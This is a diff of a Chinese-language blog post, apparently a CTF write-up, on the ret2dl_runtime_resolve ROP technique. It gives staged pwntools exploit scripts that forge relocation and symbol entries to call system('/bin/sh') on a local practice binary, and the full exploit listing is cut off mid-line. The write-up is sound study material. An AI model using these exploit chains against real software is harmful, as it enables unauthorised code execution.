@@ -1,136 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="C0yo7e">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="runtime_resolve">
+  <meta property="og:description" content>
+  <meta property="og:site_name" content="The lair of C0yo7e">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="The lair of C0yo7e" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
 
-<!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- Site Title -->
+  <title>The lair of C0yo7e</title>
 
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
 
-    <!--Description-->
-    
-        <meta name="description" content="做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位
-控制程序执行 dl_resolve 函数    给定 Link_map 以及 index 两个参数">
-    
-
-    <!--Author-->
-    
-        <meta name="author" content="C0yo7e">
-    
-
-    <!--Open Graph Title-->
-    
-        <meta property="og:title" content="runtime_resolve">
-    
-
-    <!--Open Graph Description-->
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="The lair of C0yo7e">
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="article">
-    
-
-    <!--Page Cover-->
-    
-
-    <meta name="twitter:card" content="summary">
-    
-
-    <!-- Title -->
-    
-    <title>runtime_resolve - The lair of C0yo7e</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
-
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/style.css">
-
-    <!-- Google Analytics -->
-    
-
+  <!-- Google Analytics -->
+  
 
 </head>
 
+  <body>
+    <!-- Page Header -->
 
-<body>
 
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
-
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-        </ul>
-    </div>
-</div>
-
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
-</nav>
-
-<div class="container">
-
-    <!-- Main Content -->
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
     <div class="row">
-    <div class="col-sm-12">
-
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
-        
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">runtime_resolve</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/<your-github-username>">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
     </div>
+  </div>
 </header>
 
-        <section class="main">
-            
-<div class="post">
-
-    <div class="post-header">
-        <h1 class="title">
-            <a href="/2019/10/07/runtime-resolve/">
-                runtime_resolve
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-10-07</span>
-            
-            
-            
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By C0yo7e</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-10-07</span>
+            <span class="time">13:52:43</span>
+          </span>
+          
         </div>
-    </div>
-
-    <div class="content">
-
-        <!-- Gallery -->
+        <!-- Tags -->
         
-
-        <!-- Post Content -->
-        <p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p>
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <hr>
+<p>title: runtime_resolve<br>date: 2019-10-07 12:23:05<br>tags:</p>
+<hr>
+<p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p>
 <p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p>
 <p>对于此类题目：<br>关键点：</p>
 <ol>
@@ -144,18 +125,18 @@
 <p>然后贴一段我也没有理解的东西看看</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure>
 
-<p>然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址）<br><img src="%E5%9B%BE%E7%89%871.png" alt></p>
-<p>第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6<br><img src="%E5%9B%BE%E7%89%872.png" alt></p>
+<p>然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址）<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%871.png" alt></p>
+<p>第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%872.png" alt></p>
 <p>push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg）</p>
 <p>然后跳到plt[0]  (0x8048380) 里，将linkmap  push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read  got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址)</p>
 <p>关于四个关键函数的地址提取：<br>plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addr<br>rel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addr<br>dynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addr<br>dynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr</p>
 <p>objdump -s -j .rel.plt babystack<br>objdump -d -j .plt babystack</p>
 <p>（直接找ida来得更快一点）</p>
-<p>readelf -S bof<br><img src="%E5%9B%BE%E7%89%873.png" alt></p>
-<p>readelf -d bof<br><img src="%E5%9B%BE%E7%89%874.png" alt></p>
+<p>readelf -S bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%873.png" alt></p>
+<p>readelf -d bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%874.png" alt></p>
 <p>JMPREL == .rel.plt<br>SYMTAB == .dynsym<br>STRREL == .dynstr<br>plt貌似只有-S里能找到</p>
-<p>readelf -r bof<br><img src="%E5%9B%BE%E7%89%875.png" alt></p>
-<p>607 -&gt; write的.rel.plt  607&lt;&lt;8 –&gt; 6<br>x/4wx .dynsym的地址+0x10*6    第一个参数是在str里的偏移<br>x/s .str的地址+上面的偏移      得到的是函数名的字符串<br><img src="%E5%9B%BE%E7%89%876.png" alt><br>x/3i  要查函数的plt表地址<br><img src="%E5%9B%BE%E7%89%877.png" alt>    </p>
+<p>readelf -r bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%875.png" alt></p>
+<p>607 -&gt; write的.rel.plt  607&lt;&lt;8 –&gt; 6<br>x/4wx .dynsym的地址+0x10*6    第一个参数是在str里的偏移<br>x/s .str的地址+上面的偏移      得到的是函数名的字符串<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%876.png" alt><br>x/3i  要查函数的plt表地址<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%877.png" alt>    </p>
 <p>Jmp –&gt; got表地址<br>Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）<br>Jmp –&gt; plt[0]的地址</p>
 <p>再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中<br>GOT<a href="GOT+8">2</a>是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址</p>
 <p>_dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write</p>
@@ -165,145 +146,68 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line"></span><br><span class="line">payload1 = &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(write_plt)</span><br><span class="line">payload1 += &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(1)</span><br><span class="line">payload1 += p32(base_stage+80)</span><br><span class="line">payload1 += p32(len(cmd))</span><br><span class="line">payload1 += &apos;A&apos; * (80 - len(payload1))</span><br><span class="line">payload1 += cmd</span><br><span class="line">payload1 += &apos;A&apos; * (100 - len(payload1))</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>“/bin/sh“被打出来了</p>
-<p><img src="%E5%9B%BE%E7%89%878.png" alt></p>
+<p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%878.png" alt></p>
 <p>Part 2<br>控制eip为pit[0]地址 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380  # objdump -d -j .plt bof</span><br><span class="line">index_offset = 0x20  # write&apos;s index</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E5%9B%BE%E7%89%879.png" alt></p>
+<p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%879.png" alt></p>
 <p>Part 3<br>控制index_offset 指向fake_reloc</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380 # objdump -d -j .plt bof</span><br><span class="line">rel_plt = 0x08048330 # objdump -s -j .rel.plt bof</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">r_info = 0x607 # write: Elf32_Rel-&gt;r_info</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E5%9B%BE%E7%89%8710.png" alt></p>
+<p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8710.png" alt></p>
 <p>Part 4<br>伪造fake_sym  指向st_name</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = 0x4c</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E5%9B%BE%E7%89%8711.png" alt></p>
+<p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8711.png" alt></p>
 <p>Part 5<br>St_name指向 ‘write’，继续回显</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;write\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E5%9B%BE%E7%89%8712.png" alt></p>
+<p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8712.png" alt></p>
 <p>Part 6<br>把write改成system来getshell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>就可以成功getshell了！！！</p>
-<p><img src="%E5%9B%BE%E7%89%8713.png" alt></p>
+<p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8713.png" alt></p>
 <p>完整exp</p>
 <figure class="highlight plain"><figcaption><span>python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - 